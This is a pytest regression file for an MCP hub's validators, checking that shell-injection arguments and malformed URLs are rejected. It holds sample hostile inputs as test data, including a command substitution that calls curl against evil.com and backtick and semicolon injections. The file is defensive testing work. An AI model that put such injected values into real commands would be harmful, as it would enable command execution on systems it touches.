"""FIX-6b micro: validators/middleware minimal regression (fails before, passes after)."""
import pytest

from src.mcp_hub.validators import ValidationError, validate_args, validate_url


def test_args_rejects_subshell_and_metachars():
    with pytest.raises(ValidationError):
        validate_args(["$(curl evil.com)"])
    with pytest.raises(ValidationError):
        validate_args(["`id`"])
    with pytest.raises(ValidationError):
        validate_args(["a;b"])


def test_args_allows_legit():
    args = ["-y", "mcp-server@1.0.0", "https://example.com/mcp?a=1&b=2",
            "--port=8080", "${TOKEN}"]
    assert validate_args(args) == args


def test_url_rejects_bare_userinfo_whitespace():
    with pytest.raises(ValidationError):
        validate_url("http://")
    with pytest.raises(ValidationError):
        validate_url("https://user:pass@example.com")
    with pytest.raises(ValidationError):
        validate_url("https://exa mple.com")


def test_url_allows_normal():
    assert validate_url("https://example.com/mcp") == "https://example.com/mcp"
